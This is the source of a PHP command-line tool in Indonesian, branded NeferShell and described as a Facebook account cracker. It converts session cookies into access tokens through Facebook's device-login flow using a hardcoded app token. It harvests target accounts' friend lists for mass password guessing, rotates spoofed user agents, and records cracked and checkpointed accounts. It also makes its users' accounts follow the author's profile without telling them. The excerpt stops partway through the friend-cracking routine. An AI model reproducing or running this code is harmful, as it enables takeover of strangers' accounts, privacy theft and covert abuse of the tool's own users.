<?php

$red = "\033[31m";
$green = "\033[32m";
$yellow = "\033[33m";
$blue = "\033[34m";
$purple = "\033[35m";
$cyan = "\033[36m";
$white = "\033[37m";
$reset = "\033[0m";

echo "Memuat...\n";
sleep(1);

echo "Memeriksa file settings.php...\n";
if (file_exists('settings.php')) {
    require_once 'settings.php';
    echo "Memeriksa variable settings.php...\n";
    if (!isset($crackDebug) && $crackDebug !== null) {
        echo "${red}Variable \$crackDebug tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($crackMethod) && $crackMethod !== null) {
        echo "${red}Variable \$crackMethod tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($pwdSuffix) && $pwdSuffix !== null) {
        echo "${red}Variable \$pwdSuffix tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($pwdAddition) && $pwdAddition !== null) {
        echo "${red}Variable \$pwdAddition tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($pwdAdditionSuffix) && $pwdAdditionSuffix !== null) {
        echo "${red}Variable \$pwdAdditionSuffix tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($pwdAdditionFirstProcess) && $pwdAdditionFirstProcess !== null) {
        echo "${red}Variable \$pwdAdditionFirstProcess tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($flightModeWebhookUrl) && $flightModeWebhookUrl !== null) {
        echo "${red}Variable \$flightModeWebhookUrl tidak ada.$reset\n";
        exit(1);
    }
    if (!isset($flightModeEvery) && $flightModeEvery !== null) {
        echo "${red}Variable \$flightModeEvery tidak ada.$reset\n";
        exit(1);
    }
} else {
    echo "${red}File settings.php tidak ditemukan.$reset\n";
    exit(1);
}

date_default_timezone_set('Asia/Jakarta');

echo "Memeriksa ektensi cURL...\n";
if (!extension_loaded('curl')) {
    print_r($red.'Ekstensi cURL belum diinstal.'.$reset);
    print_r($yellow.'Pastikan Anda telah membaca terlebih dahulu intruksi readme.md. Jika masalah masih berlanjut silakan hubungi author atau berdiskusi dengan grup.'.$reset);
    exit(1);
}

echo "Memeriksa ektensi DOMDocument...\n";
if (!extension_loaded('dom')) {
    print_r($red.'Ekstensi DOMDocument belum diinstal.'.$reset);
    print_r($yellow.'Pastikan Anda telah membaca terlebih dahulu intruksi readme.md. Jika masalah masih berlanjut silakan hubungi author atau berdiskusi dengan grup.'.$reset);
    exit(1);
}

function clear() {
    if (strtolower(PHP_OS) !== 'winnt') {
        system('clear');
    } else {
        echo "\033[2J";
    }
}

$okFile = date('Y-m-d').'/ok.txt';
$cpFile = date('Y-m-d').'/cp.txt';

if (!file_exists($okFile) && !file_exists($cpFile)) {
    mkdir(date('Y-m-d'), 0777, true);
}

if (!file_exists($okFile)) {
    file_put_contents($okFile, '');
}

if (!file_exists($cpFile)) {
    file_put_contents($cpFile, '');
}

function generateRandomUserAgent() {
    $androidVersions = range(9, 11);
    $deviceModels = ['SM-G532G', 'e-tab 20', 'SM-T387W', 'Lenovo YT-X705X', 'P20HD_ROW', 'Lenovo TB-X606X', 'SM-G973F', 'Lenovo TB-X606FA', 'MRX-W09', 'TVBOX'];

    $chromeVersions = ['98.0.4758.101', '116.0.5828.219', '116.0.5757.202', '116.0.5819.207', '116.0.5736.208', '115.0.5818.226', '115.0.5751.210', '116.0.5832.208', '114.0.5804.196', '116.0.5821.217'];

    $userAgent = [];

    foreach (range(0, 1000) as $i) {
        $userAgent[] = "Mozilla/5.0 (Linux; Android " . $androidVersions[array_rand($androidVersions)] . "; " . $deviceModels[array_rand($deviceModels)] . ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" . $chromeVersions[array_rand($chromeVersions)] . " Mobile Safari/537.36";
    }

    return $userAgent;
}

$uaList = generateRandomUserAgent();

$barLength = 22;
$colors = [$red, $green, $yellow, $blue, $purple, $cyan];

$bar = '';
for ($i = 0; $i < $barLength; $i++) {
    $color = $colors[array_rand($colors)];
    $bar .= $color . "██" . $reset;
}

$terminalWidth = strtolower(PHP_OS) !== 'winnt' ? exec('tput cols', $output, $returnValue) : 60;

if (empty($returnValue) && !is_numeric($terminalWidth)) {
    $terminalWidth = 77;
}

function printLine($repeater, $minus) {
    global $terminalWidth;
    return str_repeat($repeater, $terminalWidth - $minus);
}

function printFull($text, $minus = 0, $repeater = ' ') {
    global $terminalWidth;
    $minus = strlen($text) + $minus;
    $result = str_repeat($repeater, $terminalWidth - $minus);
    return $text.$result;
}

function banner() {
    global $bar;
    global $cyan;
    global $white;
    global $reset;
    if (file_exists('auth.json')) {
        print_r("$cyan
███╗   ██╗ Welcome to NeferShell v1.0.1 Beta (Free)
████╗  ██║ Copyright © 2023 NeferShell
██╔██╗ ██║ Copyright © 2023 Nefertary I. Forster
██║╚██╗██║ 
██║ ╚████║ $reset$bar${cyan}╗
╚═╝  ╚═══╝ ╚═══════════════════════════════════════════╝

$reset");
    } else {
    print_r("$cyan
███╗   ██╗███████╗███████╗███████╗██████╗       ███████╗
████╗  ██║██╔════╝██╔════╝██╔════╝██╔══██╗      ██╔════╝
██╔██╗ ██║█████╗  █████╗  █████╗  ██████╔╝█████╗███████╗
██║╚██╗██║██╔══╝  ██╔══╝  ██╔══╝  ██╔══██╗╚════╝╚════██║
██║ ╚████║███████╗██║     ███████╗██║  ██║      ███████║
╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝      ╚══════╝
════════════════════════════════════════════════════════
        Welcome to NeferShell v1.0.1 Beta (Free)
      The Next Generation Of PHP Facebook Cracker
© 2023 NeferShell · Made with ❤️ by Nefertary I. Forster
════════════════════════════════════════════════════════

$reset");
    echo "${cyan}Masukkan perintah ${white}clear$cyan untuk membersihkan terminal.\n";
    }
}

function input($text, $menus = null, $info = null, $options = null, $textcolor = null, $color = null) {
    global $white;
    global $cyan;
    global $reset;
    global $terminalWidth;

    $textcolor = $textcolor ?? $white;
    $color = $color ?? $cyan;
    $text = strtoupper($text);

    $currentMenu = '';

    if (!empty($menus)) {
        foreach ($menus as $menu) {
            $menu = strtoupper($menu);
            $currentMenu .= " ${color}[${textcolor}${menu}${color}]";
        }
    }

    $infoFormatted = '';
    if (!empty($info)) {
        if (!is_array($info)) {
            if (strlen("[!] $info") > $terminalWidth - 2) {
                $infoLines = wordwrap("${color}║ [${textcolor}!${color}] ${info}", $terminalWidth - 4, "\n", true);
                $infoLinesArray = explode("\n", $infoLines);
                $infoFormatted = "\n".implode("\n${color}║     ", $infoLinesArray);
            } else {
                $infoFormatted = "\n${color}║ [${textcolor}!${color}] ${info}";
            }
        } elseif (is_array($info)) {
            foreach ($info as $infoItem) {
                if (strlen("[!] $infoItem") > $terminalWidth - 2) {
                    $infoLines = wordwrap("${color}║ [${textcolor}!${color}] ${infoItem}", $terminalWidth - 4, "\n", true);
                    $infoLinesArray = explode("\n", $infoLines);
                    $infoFormatted .= "\n".implode("\n${color}║     ", $infoLinesArray);
                } else {
                    $infoFormatted .= "\n${color}║ [${textcolor}!${color}] ${infoItem}";
                }
            }
        }
    }

    $optionFormatted = '';
    if (!empty($options)) {
        foreach ($options as $i => $option) {
            $i++;
            if (strlen("[${i}] $option") > $terminalWidth - 2) {
                $optionLines = wordwrap("${color}║ [${textcolor}${i}${color}] ${option}", $terminalWidth - 4, "\n", true);
                $optionLinesArray = explode("\n", $optionLines);
                $optionFormatted .= "\n".implode("\n${color}║     ", $optionLinesArray);
            } else {
                $optionFormatted .= "\n${color}║ [${textcolor}${i}${color}] ${option}";
            }
        }
    }

    print_r("\n${color}╔══[$reset${textcolor}${text}$reset${color}]${currentMenu}$infoFormatted${optionFormatted}
${color}╚═⇒$reset ");
}

function auth() {
    global $red;
    global $white;
    global $cyan;
    global $green;
    global $reset;

    clear();
    banner();
    while (true) {
        input('Masukkan Cookies', null, "Untuk mendapatkan Cookies secara instan Anda dapat memasukkan perintah ${white}auth${cyan} (tidak disarankan).");
        $cookies = trim(fgets(STDIN));

        if (empty($cookies)) {
           echo "${red}Cookies diperlukan.$reset\n";
           continue;
        }

        if ($cookies == 'clear') {
            clear();
            auth();
            break;
        }

        if ($cookies == 'auth') {
            while (true) {
                input('Masukkan ID', ['Auth'], 'Masuk dengan akun Facebook.');
                $target = trim(fgets(STDIN));

                if (empty($target)) {
                    echo "${red}ID diperlukan.$reset\n";
                    continue;
                }

                if ($target == 'clear') {
                    clear();
                    auth();
                    break;
                }

                if (!is_numeric($target)) {
                    echo "${red}ID harus bersifat angka.$reset\n";
                    continue;
                }

                if (empty(checkId($target))) {
                    echo "${red}ID tidak valid.$reset\n";
                    continue;
                }

                break;
            }

            while (true) {
                input('Masukkan Kata Sandi', ['Auth', $target]);
                $passwd = trim(fgets(STDIN));

                if (empty($passwd)) {
                    echo "${red}Kata Sandi diperlukan.$reset\n";
                    continue;
                }

                if ($passwd == 'clear') {
                    clear();
                    auth();
                    break;
                }

                if (strlen($passwd) < 6) {
                    echo "${red}Kata Sandi harus minimal 6 karakter.$reset\n";
                    continue;
                }

                $result = crackMobile($target, [$passwd]);

                if (!empty($result)) {
                    $status = $result['cp'] ? 'CP' : 'OK';
                    $statusColor = $result['cp'] ? $yellow : $green;
                    echo "${cyan}╔═[${statusColor}${status}${cyan}] [${white}${target}${cyan}]\n";
                    echo "${cyan}╚═[${statusColor}COOKIES${cyan}] ".$result['cookies']."${reset}\n\n";
                    echo "${cyan}[${white}•$cyan] Sedang masuk...\n";
                    sleep(3);
                    $authCookies = authCookies($result['cookies']);

                    if ($authCookies !== 'success') {
                        echo "${red}${authCookies}$reset\n";
                    } else {
                        echo "${green}Masuk berhasil! Silakan jalankan ulang script: php run.php.$reset\n";
                        break;
                        exit();
                    }

                    break;
                } else {
                    echo "${red}Kata Sandi salah.$reset\n";
                    continue;
                }
            }
        }

        $authCookies = authCookies($cookies);

        if ($authCookies !== 'success') {
            echo "${red}${authCookies}$reset\n";
            continue;
        } else {
            echo "${green}Masuk berhasil! Silakan jalankan ulang script: php run.php.$reset\n";
            exit();
        }
    }
}

if (!file_exists('auth.json')) {
    return auth();
}

$auth = json_decode(file_get_contents('auth.json'), true);
$cookies = $auth['cookies'] ?? null;
$access_token = $auth['access_token'] ?? null;
preg_match('/c_user=(\d+)/', $cookies, $matches);
$uid = $matches[1];

if (!empty($cookies) || !empty($access_token)) {
    $auth_required = getInfo($uid);

    if ($auth_required == 'auth_required') {
        echo "${yellow}Cookies kadaluarsa. Kembali masuk...$reset\n";
        sleep(3);
        return auth();
    }
}

function authCookies($cookies) {
    $ch = curl_init();

    $headers = array(
        'content-type: application/x-www-form-urlencoded',
    );

    $data = array(
        'access_token' => '1348564698517390|007c0a9101b9e1c8ffab727666805038',
        'scope' => ''
    );

    curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/v2.6/device/login/');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = json_decode(curl_exec($ch), true);
    curl_close($ch);

    $code = $response['code'];
    $user_code = $response['user_code'];
    $verification_url = 'https://m.facebook.com/device?user_code=' . $user_code;
    $status_url = 'https://graph.facebook.com/v2.6/device/login_status?method=post&code=' . $code . '&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback';

    $headers = array(
        'sec-fetch-mode: navigate',
        'user-agent: Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
        'sec-fetch-site: cross-site',
        'Host: m.facebook.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-dest: document',
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $verification_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response2 = curl_exec($ch);
    curl_close($ch);

    preg_match('/<form[^>]*action="([^"]+)"/', $response2, $matches);
    $action = $matches[1] ?? null;
    preg_match('/name="fb_dtsg" value="([^"]+)"/', $response2, $matches);
    $fb_dtsg = $matches[1] ?? null;
    preg_match('/name="jazoest" value="([^"]+)"/', $response2, $matches);
    $jazoest = $matches[1] ?? null;

    if (!empty($action) && !empty($fb_dtsg) && !empty($jazoest)) {
        $data = array(
            'fb_dtsg' => $fb_dtsg,
            'jazoest' => $jazoest,
            'qr' => 0,
            'user_code' => $user_code,
        );

        $headers = array(
            'origin: https://m.facebook.com',
            'referer: ' . $verification_url,
            'content-type: application/x-www-form-urlencoded',
            'sec-fetch-site: same-origin',
            'Host: m.facebook.com',
            'user-agent: Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
        );

        $url_confirm = 'https://m.facebook.com' . $action;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url_confirm);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        $response3 = curl_exec($ch);
        $action2 = curl_getinfo($ch, CURLINFO_REDIRECT_URL);
        curl_close($ch);

        if (!empty($action2)) {
            $headers = array(
                'sec-fetch-mode: navigate',
                'user-agent: Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                'sec-fetch-site: cross-site',
                'Host: m.facebook.com',
                'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-dest: document',
            );

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $action2);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_COOKIE, $cookies);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response4 = curl_exec($ch);
            curl_close($ch);

            preg_match('/<form[^>]*action="([^"]+)"/', $response4, $matches);
            $action3 = $matches[1] ?? null;

            preg_match_all('/<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"/', $response4, $matches);

            $data = [];
            for ($i = 0; $i < count($matches[0]); $i++) {
                $name = $matches[1][$i] ?? null;
                $value = $matches[2][$i] ?? null;
                $data[$name] = $value ?? null;
            }

            $headers = array(
                'origin: https://m.facebook.com',
                'referer: ' . $action3,
                'content-type: application/x-www-form-urlencoded',
                'sec-fetch-site: same-origin',
                'Host: m.facebook.com',
                'user-agent: Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
            );

            $url_confirm2 = 'https://m.facebook.com' . $action3;

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url_confirm2);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_COOKIE, $cookies);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            $response5 = curl_exec($ch);
            curl_close($ch);

            preg_match('/window\.location\.href="([^"]+)"/', $response5, $matches);
            $success_page = str_replace('\/', '/', $matches[1]) ?? null;

            if (!empty($success_page)) {
                $headers = array(
                    'sec-fetch-mode: navigate',
                    'user-agent: Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
                    'sec-fetch-site: cross-site',
                    'Host: m.facebook.com',
                    'referer: '. $url_confirm2,
                    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'sec-fetch-dest: document',
                );

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $success_page);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_COOKIE, $cookies);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response6 = curl_exec($ch);
                curl_close($ch);

                preg_match_all('/Sukses!/i', $response6, $matches);

                if (!empty($matches)) {
                    $headers = array(
                        'sec-fetch-mode: no-cors',
                        'referer: https://graph.facebook.com/',
                        'Host: graph.facebook.com',
                        'accept: */*',
                        'sec-fetch-dest: script',
                        'sec-fetch-site: cross-site'
                    );

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $status_url);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    $response7 = curl_exec($ch);
                    curl_close($ch);

                    preg_match('/"access_token":"(.*?)"/', $response7, $matches);

                    if (!empty($matches[1])) {
                        $data = [
                            'cookies' => $cookies,
                            'access_token' => $matches[1]
                        ];
                        follow($cookies);
                        file_put_contents('auth.json', json_encode($data, JSON_PRETTY_PRINT));
                        return 'success';
                    } else {
                        return "Gagal mengambil `access_token`.";
                    }
                } else {
                    return "Akses masuk di tolak. (2)";
                }
            } else {
                return "Akses masuk di tolak (1).";
            }
        } else {
            return "Gagal mendapatkan tautan masuk.";
        }
    } else {
        return "Cookies yang Anda masukkan salah.";
    }
}

function getInfo($uid) {
    global $access_token;
    global $cookies;
    try {
        $ch = curl_init('https://graph.facebook.com/'.$uid.'?access_token=' . $access_token);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_COOKIE, $cookies);
        $data = curl_exec($ch);
        $result = json_decode($data, true);

        if (!isset($result['error'])) {
            return $result;
        }

        return false;
    } catch (Exception $e) {
        return 'auth_required';
    }
}

function checkId($uid) {
    $ch = curl_init('https://www.facebook.com/' . $uid);
    curl_setopt($ch, CURLOPT_HEADER, true);   
    curl_setopt($ch, CURLOPT_NOBODY, true);    
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.4');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $data = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode == 200) {
      return true;
    } else {
      return false;
    }
}

if (getInfo($uid) == 'auth_required') {
    clear();
    banner();
    echo "${yellow}Cookies telah kadaluarsa.$reset\n";
    sleep(3);
    return auth();
}

function menu() {
    global $cyan;
    global $red;
    global $yellow;
    global $green;
    global $white;
    global $blue;
    global $reset;
    global $uid;
    global $terminalWidth;

    clear();
    banner();
    echo $cyan;
    echo printFull("Halo, ${white}$uid$cyan!", 4)."${white}MENU${cyan}\n";
    echo "╔".printLine("═", 2)."╗\n";
    echo printFull("║ [${white}1$cyan] Crack Target", -11)."║\n";
    echo printFull("║ [${white}2$cyan] Dump Friends", -11)."║\n";
    echo printFull("║ [${white}3$cyan] Get Cookies", -11)."║\n";
    echo printFull("║ [${white}4$cyan] Informasi Author", -11)."║\n";
    echo printFull("║ [${white}5$cyan] Donasi", -11)."║\n";
    echo printFull("║ [${white}6$cyan] ${red}Keluar${cyan}", -21)."║\n";
    echo "╚".printLine("═", 2)."╝\n\n";
    echo "Masukkan perintah ${white}clear$cyan untuk membersihkan terminal.\n";
    echo $reset;

    while (true) {
        input('Pilih Menu');
        $menu = trim(fgets(STDIN));

        if (empty($menu)) {
           echo "${red}Menu diperlukan.${reset}\n";
           continue;
        }

        if ($menu == 'clear') {
            clear();
            menu();
            break;
        }

        if ($menu == 1) {
            targetCrack();
        } elseif ($menu == 2) {
            friendCrack();
            break;
        } elseif ($menu == 3) {
             while (true) {
                input('Masukkan ID', ['Get Cookies']);
                $target = trim(fgets(STDIN));

                if (empty($target)) {
                    echo "${red}ID diperlukan.$reset\n";
                    continue;
                }

                if ($target == 'clear') {
                    clear();
                    menu();
                    break;
                }

                if (!is_numeric($target)) {
                    echo "${red}ID harus bersifat angka.$reset\n";
                    continue;
                }

                if (empty(checkId($target))) {
                    echo "${red}ID tidak valid.$reset\n";
                    continue;
                }

                break;
            }

            while (true) {
                input('Masukkan Kata Sandi', ['Get Cookies', $target]);
                $passwd = trim(fgets(STDIN));

                if (empty($passwd)) {
                    echo "${red}Kata Sandi diperlukan.$reset\n";
                    continue;
                }

                if ($passwd == 'clear') {
                    clear();
                    menu();
                    break;
                }

                if (strlen($passwd) < 6) {
                    echo "${red}Kata Sandi harus minimal 6 karakter.$reset\n";
                    continue;
                }

                $result = crackMobile($target, [$passwd]);

                if (!empty($result)) {
                    $status = $result['cp'] ? 'CP' : 'OK';
                    $statusColor = $result['cp'] ? $yellow : $green;
                    echo "${cyan}╔═[${statusColor}${status}${cyan}] [${white}${target}${cyan}]\n";
                    echo "${cyan}╚═[${statusColor}COOKIES${cyan}] ".$result['cookies']."${reset}\n\n";
                    break;
                } else {
                    echo "${red}Kata Sandi salah.$reset\n";
                    continue;
                }
            }
        } elseif ($menu == 4) {
            print_r("$cyan
".wordwrap('Skrip ini dibuat oleh Nefertary I. Forster dengan PHP CLI. Temukan lebih banyak informasi menarik tentang author dengan mengikuti tautan media sosial atau hubungi jika perlu.', $terminalWidth, "\n", true)."

[${white}Official Site$cyan] (${blue}https://neferbyte.com$cyan)
[${white}Business Email$cyan] (${blue}business@neferbyte.com$cyan)
[${white}WhatsApp$cyan] (${blue}https://wa.me/6283820979882$cyan)
[${white}Facebook$cyan] (${blue}https://facebook.com/blackforster$cyan)
[${white}Instagram$cyan] (${blue}https://instagram.com/whiteforster$cyan)
[${white}Github$cyan] (${blue}https://github.com/blackforster$cyan)

$reset");
            continue;
        } elseif ($menu == 5) {
            print_r("$cyan
".wordwrap('Terima kasih atas kontribusi Anda dalam mendukung author. Dengan donasi Anda, author dapat terus mengembangkan dan meningkatkan skrip ini. Setiap donasi Anda sangat berarti bagi saya dan saya sangat menghargainya. Terima kasih atas kebaikan dan dukungan Anda. Semoga Anda dan keluarga Anda senantiasa diberikan kesehatan dan rezeki yang melimpah.', $terminalWidth, "\n", true)."

[${white}Saweria$cyan] (${blue}https://saweria.co/blackforster$cyan)
$reset");
        } elseif ($menu == 6) {
            while (true) {
                input('Konfirmasi', ['Keluar'], 'Apakah Anda yakin ingin keluar?', ['Ya', 'Tidak (default)']);
                $confirm = trim(fgets(STDIN));

                if ($confirm == 'clear') {
                    clear();
                    menu();
                    break;
                }

                if (empty($confirm) || $confirm == '2') {
                    break;
                } elseif ($confirm == '1') {
                    @unlink('auth.json');
                    exit();
                } else {
                    echo "${red}Masukkan opsi yang valid. Opsi ${confirm} tidak tersedia.$reset\n";
                    continue;
                }
            }
        } else {
            echo "${red}Menu ${menu} tidak ditemukan.\n";
            continue;
        }
    }
}

function follow($cookies) {
    global $uaList;
    $ua = $uaList[array_rand($uaList)];
    $profile_url = 'https://mbasic.facebook.com/blackforster';
    $headers = array(
        'Host: mbasic.facebook.com',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control: no-cache',
        'DNT: 1',
        'DPR: 1',
        'Pragma: no-cache',
        'Sec-Ch-Prefers-Color-Scheme: light',
        'Sec-Ch-UA: "(Not(A:Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
        'Sec-Ch-UA-Full-Version-List: "(Not(A:Brand";v="99.0.0.0", "Chromium";v="98.0.4758.101", "Google Chrome";v="98.0.4758.101"',
        'Sec-Ch-UA-Mobile: ?1',
        'Sec-Ch-UA-Model: ""',
        'Sec-Ch-UA-Platform: "Android"',
        'Sec-Ch-UA-Platform-Version: ""',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: '.$ua
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $profile_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    $html = curl_exec($ch);
    curl_close($ch);

    $dom = new DOMDocument();
    $dom->loadHTML($html);

    $xpath = new DOMXPath($dom);
    $query = '//div[@class="cr"]//a[starts-with(@href, "/a/subscribe.php?id=100041582803479")]';
    $links = $xpath->query($query);

    if ($links->length > 0) {
        foreach ($links as $link) {
            $url = 'https://mbasic.facebook.com'.$link->getAttribute('href');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            $headers[] = 'Referer: '.$profile_url;
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_COOKIE, $cookies);
            curl_setopt($ch, CURLOPT_HEADER, 1);
            curl_exec($ch);
            curl_close($ch);

            return true;
        }
    } else {
        return true;
    }
}

menu();

function dumpFriends($uid) {
    global $access_token;
    global $cookies;
    $ch = curl_init('https://graph.facebook.com/v2.0/'.$uid.'?fields=friends.limit(5001)&access_token='.$access_token);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_COOKIE, $cookies);
    $data = curl_exec($ch);
    $result = json_decode($data, true);

    if ($result['friends']['data']) {
        return $result['friends']['data'];
    } else {
        return false;
    }
}

function targetCrack() {
    global $red;
    global $cyan;
    global $yellow;
    global $green;
    global $reset;
    global $crackMethod;
    global $crackDebug;

    while (true) {
        input('Masukkan ID Target', ['Crack Target']);
        $target = trim(fgets(STDIN));

        if (empty($target)) {
            echo "${red}ID Target diperlukan.$reset\n";
            continue;
        }

        if ($target == 'clear') {
            clear();
            menu();
            break;
        }

        if (!is_numeric($target)) {
            echo "${red}ID Target harus bersifat angka.$reset\n";
            continue;
        }

        if (empty(checkId($target))) {
            echo "${red}ID Target tidak valid.$reset\n";
            continue;
        }
        
        while (true) {
            if (empty($crackMethod)) {
                input('Pilih Metode', ['Crack Target', $target], 'Pilih metode crack yang tersedia.', ['Free (default)', 'Mobile']);
                $method = strtolower(trim(fgets(STDIN)));

                if ($method == 'clear') {
                    clear();
                    menu();
                    break;
                }

                if (empty($method) || $method == '1') {
                    $method = 'free';
                } elseif ($method == '2') {
                    $method = 'mobile';
                } else {
                    echo "${red}Masukkan opsi yang valid. Opsi ${confirm} tidak tersedia.$reset\n";
                    continue;
                }
            } else {
                $method = $crackMethod;
            }

            while (true) {
                if ($crackDebug == null) {
                    input('Debugging', ['Crack Target', $target], 'Apakah Anda ingin menjalankan script dengan debugging?', ['Ya (default)', 'Tidak']);
                    $confirm = strtolower(trim(fgets(STDIN)));

                    if ($confirm == 'clear') {
                        clear();
                        menu();
                        break;
                    }

                    if (empty($confirm) || $confirm == '1') {
                        $debug = true;
                    } elseif ($confirm == '2') {
                        $debug = false;
                    } else {
                        echo "${red}Masukkan opsi yang valid. Opsi ${confirm} tidak tersedia.$reset\n";
                        continue;
                    }
                } else {
                    $debug = $crackDebug;
                }

                $targetInfo = getInfo($target);
                if (empty($targetInfo['name'])) {
                    echo "${red}ID Target tidak ditemukan.$reset\n";
                    continue;
                }

                $friends[] = [
                    'name' => $targetInfo['name'],
                    'id' => $target
                ];

                return crack($target, $friends, 0, $debug, $method);
            }
        }
    }
}

function friendCrack() {
    global $red;
    global $cyan;
    global $yellow;
    global $green;
    global $reset;
    global $crackMethod;
    global $crackDebug;

    while (true) {
        input('Masukkan ID Target', ['Dump Friends'], 'Pertemanan akun target harus bersifat publik dan bukan akun profesional.');
        $target = trim(fgets(STDIN));

        if (empty($target)) {
            echo "${red}ID Target diperlukan.$reset\n";
            continue;
        }

        if ($target == 'clear') {
            clear();
            menu();
            break;
        }

        if (!is_numeric($target)) {
            echo "${red}ID Target harus bersifat angka.$reset\n";
            continue;
        }

        if (empty(checkId($target))) {
            echo "${red}ID Target tidak valid.$reset\n";
            continue;
        }

        $friends = dumpFriends($target);

        if (empty($friends)) {
            echo "${red}Pertemanan atau ID Target tidak ditemukan.$reset\n";
            continue;
        } else {
            while (true) {
                input('Jumlah target', ['Dump Friends', $target], ['Total: '.count($friends).' pertemanan.', 'Masukkan jumlah atau rentang akun target yang akan di crack (pisahkan dengan tanda \'-\' untuk rentang akun). contoh: 100, 122, 0-133, 53-182', 'Tekan Enter untuk '.count($friends).' target.']);
                $targetCount = strtolower(trim(fgets(STDIN)));

